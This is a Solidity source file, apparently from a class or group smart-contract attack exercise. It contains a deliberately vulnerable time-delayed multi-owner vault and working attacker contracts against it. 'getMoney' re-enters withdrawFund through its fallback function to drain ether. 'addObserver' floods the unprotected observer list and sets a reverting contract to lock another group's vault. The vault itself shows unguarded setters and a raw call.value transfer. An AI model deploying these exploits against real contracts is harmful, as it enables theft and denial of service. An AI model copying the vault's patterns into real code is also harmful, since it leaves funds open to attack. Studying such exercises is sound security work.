pragma solidity ^0.4.17;

contract BasicMultiOwnerVault {
    address[] public authorizedUsers;
    address public owner;
    address public withdrawObserver;
    address public additionalAuthorizedContract;
    address public proposedAAA;
    uint public lastUpdated;
    bool[] public votes;
    address [] public observerHistory;

    modifier onlyAuthorized() {
        bool pass = false;
        if(additionalAuthorizedContract == msg.sender) {
            pass = true;
        }
        
        for (uint i = 0; i < authorizedUsers.length; i++) {
            if(authorizedUsers [i] == msg.sender) {
                pass = true;
                break;
            }
        }
        require (pass);
        _;
    }
    
    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier recordAction() {
        lastUpdated = now;
        _;
    }
    
    function initilizeVault() recordAction onlyOnce {
        owner = msg.sender;
    }
    
    function setObserver(address ob) {
        bool duplicate = false;
        for (uint i = 0; i < observerHistory.length; i++) {
            if (observerHistory[i] == ob) {
                duplicate = true;
            }
        }
        
        if (!duplicate) {
            withdrawObserver = ob;
            observerHistory.push(ob);
        }
    }
    
    function addToReserve() payable recordAction external returns (uint) {
        assert(msg.value > 0.01 ether);
        return this.balance;
    }
    
    function basicWithdraw(address dst) internal returns (bool) {
        require(this.balance >= 0.001 ether);
        bool res = dst.call.value(0.001 ether)();
        return res;
    }
    
    function checkAllVote() private returns (bool) {
        for(uint i = 0; i < votes.length; i++) {
            if(!votes[i]) {
                return false;
            }
        }
        
        return true;
    }
    
    function clearVote() private {
        for(uint i = 0; i < votes.length; i++) {
            votes[i] = false;
        }
    }

    function addAuthorizedAccount(uint votePosition, address proposal) onlyAuthorized external {
        require(votePosition < authorizedUsers.length);
        require(msg.sender == authorizedUsers[votePosition]);
        if (proposal != proposedAAA) {
            clearVote();
            proposedAAA = proposal;
        }
        
        votes[votePosition] = true;
        if (checkAllVote()) {
            additionalAuthorizedContract = proposedAAA;
            clearVote();
        }
    }
    
    function resolve() onlyOwner {
        if(now >= lastUpdated + 12 hours) {
            selfdestruct(owner);
        }
    }

}

contract TimeDelayedVault is BasicMultiOwnerVault {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    
    function TimeDelayedVault() recordAction {
        nextWithdrawTime = now;
        withdrawCoolDownTime = 2 hours;
        //this.call(bytes4(sha3("initializeVault()")));
       
        // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
        //authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
        //authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten

        for(uint i=0; i<authorizedUsers.length; i++) {
            votes.push(false);
        }
    }
    
    function withdrawFund(address dst) onlyAuthorized external returns (bool) {
        require(now > nextWithdrawTime);
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        bool res = basicWithdraw(dst);
        nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
        return res;
    }
    function theBalance () returns (uint){
        return this.balance;
    }
    function refreshWithdrawTime() {
        nextWithdrawTime = now;
    }
}



contract getMoney{ //0x202a08c0b2cf36c94458f85c36914aa50f98bd71
    address public ct_addr = 0x0e3e24d6f30cd710599d75e7e0d5448d74ae4bdb;
    uint public count = 0;
    uint public limit = 1;
    uint public gaslimit = 30000000;
    address public ownerLALALA;
    TimeDelayedVault ct ;
    
    modifier onlyOwner() {
        require(msg.sender == ownerLALALA);
        _;
    }
    function getMoney(){
        ownerLALALA = msg.sender;
    }
    function setGas(uint _gas) onlyOwner{
        gaslimit = _gas;
    }
    function setTarget(address _addr) onlyOwner{
        ct_addr = _addr;
        ct = TimeDelayedVault(ct_addr);
    }
    function addObserver() onlyOwner{
       ct.setObserver(this);    
    }
    function hack() onlyOwner{ // need checkObserver first
         count += 1;
         ct.withdrawFund(this);
    }
    function hack2() onlyOwner{ // need checkObserver first
         ct.setObserver(this);
         count += 1;
         ct.withdrawFund(this);
    }    
    function withdraw(address addr, uint amount) onlyOwner{
        addr.transfer(amount * 1 ether);
    }
    function () payable {
        if(count<limit ){
            count += 1;
            //ct.withdrawFund.gas(gaslimit)(this);
            ct.withdrawFund(this);
        }else{
            count = 0;
        }
    }
    function theBalance () onlyOwner returns (uint _balance){
        return this.balance;
    }
    function setLimit(uint _limit) onlyOwner returns (uint) {
        limit = _limit;
        return limit;
    }
    function observe() returns (bool){
        return true;
    }
    
}

//test Observer;
//assert(withdrawObserver.call(bytes4(sha3("observe()"))));
contract test{  //not throw error  0x699e475855cd3511d7a3ea222a070febb4fe6b53
    function () {
    }
}
contract test2{//not throw error 0x97ddbd0ade30554e05e7b4545db3188b62696178
    function observe() returns (bool){
        return true;
    }
}
contract test3{//throw error //blockchain 0xba0e8d1f9673bd836e2c88e22b773caac57c356f
}

//add many observers to other group 
contract addObserver{ //blockchain 0xda8a05f20f474b28e937c003dc6c0c09bb54017b
    address public target;
    address public badContract = 0xba0e8d1f9673bd836e2c88e22b773caac57c356f;
    uint public loopLimit = 1;
    uint public offset = 0;
    address public ownerLALALA;
    
    modifier onlyOwner() {
        require(msg.sender == ownerLALALA);
        _;
    }
    function addObserver() onlyOwner{
        ownerLALALA = msg.sender;
    }
    function setTarget(address _target) onlyOwner{
        target = _target;
    }
    function setLimit(uint _limit) onlyOwner{
        loopLimit = _limit;
    }
    function setOffset(uint _offset) onlyOwner{
        offset = _offset;
    }
    function setBadContract(address _addr) onlyOwner{
        badContract = _addr;
    }
    function addManyOb() onlyOwner {
        TimeDelayedVault ct = TimeDelayedVault(target);

        for(uint i=1;i<=loopLimit;i++){
            ct.setObserver(address(i+offset));    
        }
        offset += loopLimit;
    }
    function addLastOb() onlyOwner{// add a bad address 
        TimeDelayedVault ct = TimeDelayedVault(target);
        ct.setObserver(badContract);    
    }
    function reset() onlyOwner{
        target = 0x0;
        loopLimit = 1;
        offset = 0;
    }
}

contract testObsever{
    address withdrawObserver ;//= 0x0;
    function test(){
    assert(withdrawObserver.call(bytes4(sha3("observe()"))));    }
}
